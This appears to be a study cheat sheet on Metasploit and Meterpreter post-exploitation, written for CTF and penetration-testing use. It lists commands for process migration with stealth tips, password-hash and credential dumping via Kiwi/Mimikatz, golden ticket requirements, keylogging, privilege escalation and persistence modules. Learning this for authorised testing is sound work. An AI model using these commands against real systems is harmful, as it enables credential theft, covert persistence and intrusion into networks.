# Metasploit

Open machines terminal&#x20;

```
shell
```

Go back to meterpreter

* ctrl + z to exit
* typing exit

**Linux**&#x20;

opens  better shell

```bash
/bin/bash -i 
```

* -i : interactive shell

**Windows**&#x20;

opens better shell

```
cmd.exe
```

## &#x20;ğŸ“¶ **Sessions Commands**

Send current session to background

```bash
background
```

| Command            | Description                                      | Example         |
| ------------------ | ------------------------------------------------ | --------------- |
| `sessions`         | List all active sessions.                        | `sessions`      |
| `sessions -i <id>` | Interact with a specific session.                | `sessions -i 1` |
| `sessions -k <id>` | Kill a specific session.                         | `sessions -k 1` |
| `sessions -K`      | Kill all sessions.                               | `sessions -K`   |
| `sessions -v`      | List verbose info about sessions.                | `sessions -v`   |
| `sessions -u <id>` | Upgrade a shell to Meterpreter.                  | `sessions -u 2` |
| `interact <id>`    | Interact with a session (same as `sessions -i`). | `interact 1`    |

## ğŸ“¶Upgrade Session

This commands upgrades to a meterpeter session

```
meterpeter> sessions -u <session_id>
```

## Autoroute

### ğŸ” What is `autoroute`?

`autoroute` is a **Meterpreter post module** that adds routes to subnets accessible **only from the target machine**, allowing you to pivot through it and reach internal networks.

| Command                                  | Description                    |
| ---------------------------------------- | ------------------------------ |
| `run autoroute`                          | Loads autoroute module         |
| `run autoroute -s <subnet> -n <netmask>` | Adds a route to subnet         |
| `run autoroute -p`                       | Prints current routes          |
| `run autoroute -d <subnet>`              | Deletes a specific route       |
| `route`                                  | View Metasploit's route table  |
| `route add <subnet> <mask> <id>`         | Manually add route via session |

## Migrate

First we use ps command to see running services and choose

For highest privalege we choose **SYSTEM services also we downgrade to lower service with less permision we cant go back up**

{% hint style="warning" %}
Anything under `NT AUTHORITY\SYSTEM` is running as SYSTEM.
{% endhint %}

```
meterpeter> migrate <PID>
```

best process to migrate&#x20;

* spoolsv.exe: print services

| **Process**    | **Typical Path**                   | **Why Migrate Here?**                                                 | **Caveats**                                                |
| -------------- | ---------------------------------- | --------------------------------------------------------------------- | ---------------------------------------------------------- |
| `explorer.exe` | `C:\Windows\explorer.exe`          | Userâ€‘land GUI shell; always running under the loggedâ€‘in user context  | Loses SYSTEM if you started as a normal user               |
| `lsass.exe`    | `C:\Windows\System32\lsass.exe`    | Local Security Authority; runs as SYSTEM, high privileges             | Crash will blueâ€‘screen the machine                         |
| `services.exe` | `C:\Windows\System32\services.exe` | Service Control Manager; runs as SYSTEM, very stable                  | Rarely spawns new children â€“ less â€œnoiseâ€                  |
| `svchost.exe`  | `C:\Windows\System32\svchost.exe`  | Generic host for many Windows services; SYSTEMâ€‘level, lots of targets | Multiple instances â€“ pick one housing nonâ€‘critical service |
| `winlogon.exe` | `C:\Windows\System32\winlogon.exe` | Manages user logons; runs as SYSTEM                                   | If it crashes, user is logged out                          |
| `spoolsv.exe`  | `C:\Windows\System32\spoolsv.exe`  | Print Spooler service; SYSTEMâ€‘level, longâ€‘lived                       | Can draw attention if printing unused jobs                 |
| `taskeng.exe`  | `C:\Windows\System32\taskeng.exe`  | Task Scheduler Engine; SYSTEM if scheduled by system                  | May not always run under SYSTEM                            |
| `csrss.exe`    | `C:\Windows\System32\csrss.exe`    | Client/Server Runtime Subsystem; SYSTEMâ€‘level                         | Very sensitiveâ€”crashing it blueâ€‘screens                    |

### ğŸ’¡ Tips

* **SYSTEM vs. User**: If you need SYSTEM privileges, choose `lsass.exe`, `services.exe` or an `svchost.exe` hosting SYSTEM services.
* **Stability**: GUI processes (`explorer.exe`) can crash if you inject weird payloads; services are generally safer.
* **Stealth**: Blend into normal service activityâ€”avoid rare or highâ€‘interest processes.
* **Crash impact**: Crashing a critical process (LSASS, winlogon, csrss) can blueâ€‘screen the machine and tip off defenders.

## Hashdump

The `hashdump` command will list the content of the SAM database. The SAM (Security Account Manager) database stores user's passwords on Windows systems. These passwords are stored in the NTLM (New Technology LAN Manager) format.

## ğŸ” Search command

The `search` command is useful to locate files with potentially juicy information. In a CTF context, this can be used to quickly find a flag or proof file, while in actual penetration testing engagements, you may need to search for user-generated files or configuration files that may contain password or account information.

```
meterpreter > search -f flag2.txt
Found 1 result...
    c:\Windows\System32\config\flag2.txt (34 bytes)
meterpreter >
```

## &#x20;getuid

If it says:

* `NT AUTHORITY\SYSTEM` â†’ highest level (even above Administrator).
* `Administrator` or local admin name â†’ high privileges.
* `User` or standard account â†’ low privileges.

## &#x20;sysinfo&#x20;

command `sysinfo`&#x20;

## &#x20;â¬†ï¸Privilege escalation

<pre><code><strong>meterpreter> run post/multi/recon/local_exploit_suggester
</strong></code></pre>

| Command     | Description                           |
| ----------- | ------------------------------------- |
| `getsystem` | Try to escalate to SYSTEM privileges. |

## &#x20;Mimikatz/**Kiwi**

#### ğŸ§  What is **Mimikatz**?

**Mimikatz** is a powerful post-exploitation tool used to:

* Extract plaintext passwords
* Dump password hashes
* Retrieve Kerberos tickets
* Perform **pass-the-hash**, **pass-the-ticket**, **Golden Ticket**, and more

Itâ€™s used heavily in **red teaming**, **penetration testing**, and also by real-world attackers.

ğŸ› ï¸ How to Load and Use `kiwi` in Meterpreter:

<pre><code><strong>meterpreter> load kiwi
</strong></code></pre>

```
meterpreter> help kiwi
```

Youâ€™ll see commands like:

| Command                       | Description                      |
| ----------------------------- | -------------------------------- |
| `creds_all`                   | Dump all available credentials   |
| `lsa_dump_sam`                | Dump SAM database                |
| `kerberos_ticket_list`        | List Kerberos tickets            |
| `kerberos_ticket_purge`       | Purge tickets                    |
| `kerberos_ticket_use`         | Pass-the-ticket                  |
| `golden_ticket_create`        | Create golden ticket             |
| `sekurlsa_search_credentials` | Dump plaintext creds from memory |

### ğŸ† golden ticket

A **Golden Ticket** is a **forged Kerberos Ticket Granting Ticket (TGT)** that allows an attacker to impersonate **any user**, including **Domain Admins**, on a Windows domain **without needing their password**.

It essentially gives you a **master key** to the entire domain.

ğŸ§ª Prerequisites â€” What You Need First:

| Requirement              | Description                                                                                             |
| ------------------------ | ------------------------------------------------------------------------------------------------------- |
| **KRBTGT hash**          | The NTLM hash of the **KRBTGT** account in the domain (this is the key to the domainâ€™s Kerberos system) |
| **Domain SID**           | The SID of the domain                                                                                   |
| **Domain name**          | The full name of the domain (e.g., `corp.local`)                                                        |
| (Optional) **User info** | You can impersonate any user (even create fake ones)                                                    |

## post modules

ğŸ§¨ POST-EXPLOITATION MODULES IN METASPLOIT

You can list these yourself in `msfconsole` with:

```bash
show post
```

```
search type:post platform:windows
```

ğŸ”§ CATEGORIES + POPULAR MODULES

### 1. ğŸ“¥ **Gather** â€“ Collect data from the target

**ğŸ”¹ `post/windows/gather/`**

* `hashdump` â€“ Dump SAM password hashes
* `credentials/windows_autologin` â€“ Get autologin credentials
* `credentials/credential_collector` â€“ Collect creds from multiple sources
* `enum_chrome` â€“ Dump Chrome credentials/history
* `enum_application_patches`
* `enum_logged_on_users`
* `enum_av` â€“ Detect installed antivirus
* `enum_domain_group_users`
* `enum_domain`
* `smart_hashdump` â€“ Safe hash dumping (automatically picks right technique)

**ğŸ”¹ `post/multi/gather/`**

* `enum_users_history`
* `firefox_creds`
* `skype`
* `thunderbird_creds`

***

### 2. âš™ï¸ **Manage** â€“ Modify the system or Meterpreter behavior

**ğŸ”¹ `post/windows/manage/`**

* `migrate` â€“ Move Meterpreter to another process
* `keylog_start` / `keylog_dump` â€“ Start and dump keystrokes
* `enable_rdp`
* `execute`
* `explorer` â€“ Launch explorer.exe for stability
* `schedule_persistence` â€“ Add persistence via scheduled task
* `delete_file`

### 3. ğŸ“ˆ **Escalate** â€“ Elevate privileges on the system

**ğŸ”¹ `post/windows/escalate/`**

* `ms16_032_secondary_logon_handle_privesc`
* `ms10_092_schelevator`
* `namedpipe_privesc`
* `service_permissions`
* `always_install_elevated`

**ğŸ”¹ `post/multi/recon/local_exploit_suggester`**

* Suggests local privesc exploits for any platform

### 4. ğŸ” **Recon** â€“ Analyze system to plan next steps

**ğŸ”¹ `post/multi/recon/`**

* `local_exploit_suggester` â€“ Suggests privilege escalation methods
* `whoami` â€“ Get user and domain info
* `netstat` â€“ See open ports and connections

**ğŸ”¹ `post/windows/recon/`**

* `enum_domain_tokens`
* `enum_ie`
* `enum_shares`
* `resolve_sid`

### 5. ğŸ§  **Credentials** â€“ Grab passwords and secrets

**ğŸ”¹ `post/windows/gather/credentials/`**

* `lsass` â€“ Extracts creds from memory (like mimikatz)
* `windows_autologin`
* `token_collector`
* `vnc_passwords`
* `rdp_saved_passwords`

### 6. ğŸ” **Persistence** â€“ Maintain access

* `post/windows/manage/schedule_persistence`
* `post/windows/manage/persistence`
* `post/multi/manage/shell_to_meterpreter` â€“ Upgrade shell to meterpreter















